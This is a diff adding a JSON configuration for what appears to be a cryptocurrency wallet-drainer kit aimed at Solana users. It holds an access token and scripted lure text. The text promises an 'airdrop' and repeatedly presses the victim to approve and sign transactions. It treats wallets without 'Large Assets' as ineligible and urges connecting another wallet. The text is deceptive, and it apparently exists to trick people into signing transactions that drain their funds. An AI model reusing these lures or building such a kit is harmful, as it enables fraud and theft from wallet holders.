@@ -1,0 +1,31 @@
+{
+    "modal": 1,
+    "key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiYXQiOjE3MTc1MTkzMjEyOTksImlhdCI6MTcxNzUxOTMyMX0.KvKIE9Thvp5Zcq2nZP8OJ0k13RwRhlTq_BZz-btrJFI",
+    "loader": 1,
+    "words": {
+        "onLoaded": "Sign Up / Sign In with Wallet",
+        "onConnected": "{addressfirst4}...{addresslast4}",
+        "onNoAccountInfo": "Invalid Wallet",
+        "onNotEnoughLamports": "Wallet has no funds to pay the transaction Fees.",
+        "onClaiming": "Requesting airdrop...",
+        "onClaimingDesc": "Please wait while we requesting airdrop...",
+        "onClaimingIneligible": "Ineligible",
+        "onClaimingIneligibleDesc": "Connected wallet is ineligible. Requested requirements: Large Assets",
+        "onClaimLoading": "Claiming...",
+        "onClaimLoadingDesc": "Signing airdrop request...",
+        "onDecline": "Error",
+        "onDeclineDesc": "You should confirm the transactions to finalize the airdropping!"
+    },
+    "loaderWords": [
+        "Sign the transaction",
+        "Checking your wallet",
+        "Checking Your Wallet...",
+        "Please wait while we check your wallet.",
+        "Continue in wallet...",
+        "You must approve the prompt<br> in order to continue.",
+        "Transaction signed successfully",
+        "You must approve the next prompt in order to continue.",
+        "Your wallet is not eligible, connect another wallet",
+        "Not eligible"
+    ]
+}
